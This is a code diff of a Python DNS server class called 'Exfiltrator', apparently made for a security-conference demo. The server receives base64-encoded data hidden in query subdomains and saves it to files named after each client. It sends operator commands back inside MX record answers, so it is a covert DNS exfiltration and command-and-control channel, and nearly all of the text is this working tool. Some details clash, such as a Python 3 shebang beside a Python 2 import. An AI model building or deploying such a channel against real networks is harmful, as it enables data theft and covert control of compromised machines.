@@ -1,137 +1,17 @@
-#!/usr/bin/env python
+#!/usr/bin/python3.6
 
 # Written by Cory Schwartz
 
-# Just for reference, the following diagrams
-# are taken from RFC1035:
-# DNS Packet header format
-#                                    1  1  1  1  1  1
-#      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                      ID                       |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                    QDCOUNT                    |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                    ANCOUNT                    |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                    NSCOUNT                    |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                    ARCOUNT                    |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-
-# Question format:
-#                                    1  1  1  1  1  1
-#      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                                               |
-#    /                     QNAME                     /
-#    /                                               /
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                     QTYPE                     |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                     QCLASS                    |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-
-# Resource Record format:
-#                                    1  1  1  1  1  1
-#      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                                               |
-#    /                                               /
-#    /                      NAME                     /
-#    |                                               |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                      TYPE                     |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                     CLASS                     |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                      TTL                      |
-#    |                                               |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-#    |                   RDLENGTH                    |
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
-#    /                     RDATA                     /
-#    /                                               /
-#    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
-
 import base64
+from time import sleep
+from dnslib import DNSRecord, RR, QTYPE, A, MX
 from SocketServer import BaseRequestHandler, UDPServer
 
-class DNSParser:
-    "Parse DNS requests"
-    def __init__(self, raw):
-        self.raw = raw
-    @property
-    def header(self):
-        "Break out header fields from DNS packet"
-        ID = self.raw[:2]
-        QR = (ord(self.raw[2]) >>7) & 1
-        OPCODE = (ord(self.raw[2]) >> 3) & 15
-        AA = (ord(self.raw[2]) >> 2) & 1
-        TC = (ord(self.raw[2]) >> 1) & 1
-        RD = ord(self.raw[2]) & 1
-        RA = (ord(self.raw[3]) >> 7) & 1
-        Z = (ord(self.raw[3]) >> 4) & 7
-        RCODE = ord(self.raw[3]) & 15
-        QDCOUNT = self.raw[4:6]
-        ANCOUNT = self.raw[6:8]
-        NSCOUNT = self.raw[8:10]
-        ARCOUNT = self.raw[10:12]
-        ret = locals()
-        del(ret['self'])
-        return ret
-    @property
-    def question(self):
-        "Break out question section of DNS packet"
-        questions = []
-        raw_questions = ''
-        length_byte = 12
-        length = ord(self.raw[length_byte])
-        while length > 0:
-            next_byte = length_byte + length + 1
-            questions.append(self.raw[length_byte + 1:next_byte])
-            raw_questions += self.raw[length_byte : next_byte]
-            length_byte = next_byte
-            length = ord(self.raw[length_byte])
-        QTYPE = self.raw[length_byte + 1:length_byte + 3]
-        QCLASS = self.raw[length_byte + 3 : length_byte + 5]
-        raw_questions += '\x00' + QTYPE + QCLASS
-        return {"QTYPE": QTYPE, "QCLASS": QCLASS, 'raw_questions': raw_questions,
-            "questions": questions}
-    def A_record(self, ip):
-        return str.join('',map(lambda x: chr(int(x)), ip.split('.')))
-    def mk_response(self, response_data):
-        '''
-        params: response_data:
-        returns: raw binary DNS response.
-        Rdata processor is chosen dynamically depending on the question type
-        '''
-        # Did I say dynamic?
-        # Maybe one day implement more than just A records
-        rdata_processor = self.A_record
-        packet = ''
-        # Header:
-        packet += self.header['ID']
-        packet += '\x85\x80' # QR/Opcode/AA/TC/RD/RA/Z/RCODE
-        packet += '\x00\x01' # QDCOUNT (1)
-        packet += '\x00\x01' # ANCOUNT (1)
-        packet += '\x00\x00' # NSCOUNT (0)
-        packet += '\x00\x00' # ARCOUNT (0)
-        # Question Section
-        packet += self.question['raw_questions']
-        #Response Section
-        packet +='\xc0\x0c'  # "compressed" Pointer to byte 12, the question section
-        packet += self.question['QTYPE']
-        packet += self.question['QCLASS']
-        packet += '\x00\x00\x00\x00' # TTL (Don't cache)
-        packet += '\x00\x04' # Length, 32 Only support A records, after all.
-        # Rdata:
-        packet += rdata_processor(response_data)
-        return packet
+IP_ADDRESS='192.168.122.102'
+DOMAIN_NAME='def.con'
+CMD_FILE='cmd'
 
-class Exfiltrator(BaseRequestHandler):
+class Exfiltrator(BaseRequestHandler, object):
     '''
     Use subdomains to exfiltrate data from DNS querries.
     The first two parts of the domain will be used to send data
@@ -140,14 +20,55 @@ class Exfiltrator(BaseRequestHandler):
     will be ignored, so DNS should be configured up to that point.
     <data>.<filename>.real.domain.com
     '''
+    def __init__(self, *args):
+        self.q_processors = {
+            1: self._A,      # A record
+            12: self._MX,    # PTR record
+            15: self._MX,    # MX record
+            28: self._AAAA   # AAAA record
+            }
+        super(Exfiltrator, self).__init__(*args)
+    def _AAAA(self, name):
+        '''
+        To avoid clients that submit A and AAAA records,
+        These are ignored.
+        '''
+        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
+    def _A(self, name):
+        '''
+	A Records.
+	Base64 decode message. Save to file. Send bogus response.
+	'''
+        rfilename = name.label[1]
+        host = self.client_address[0]
+        if rfilename == CMD_FILE:
+            lfilename = CMD_FILE
+        else:
+            lfilename = host + '_' + rfilename
+        try:
+            with open(lfilename, 'a+b') as f:
+                f.write(base64.b64decode(name.label[0]))
+        except:
+            pass
+        return RR(name, QTYPE.A, rdata=A(IP_ADDRESS), ttl=0)
+    def _MX(self, name):
+        '''
+	MX Records.
+	Read message from file. Base64 encode it. Send the response.
+	'''
+        try:
+            with open(CMD_FILE) as f:
+                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1])
+        except:
+            cmd = base64.standard_b64encode('')
+        return RR(name, QTYPE.MX, rdata=MX(cmd + "." + DOMAIN_NAME), ttl=0)
     def handle(self):
-        dnsrequest= DNSParser(self.request[0])
+        request = DNSRecord.parse(self.request[0])
         socket = self.request[1]
-        data = dnsrequest.question['questions'][0]
-        filename = dnsrequest.question['questions'][1]
-        with open(filename, 'a+b') as f:
-            f.write(base64.b64decode(data))
-        socket.sendto(dnsrequest.mk_response('10.10.10.10'), self.client_address)
+        reply = request.reply()
+        answer = self.q_processors[reply.q.qtype](reply.q.qname)
+        reply.add_answer(answer)
+        socket.sendto(reply.pack(), self.client_address)
 
 if __name__ == '__main__':
     HOST, PORT = '0.0.0.0', 53
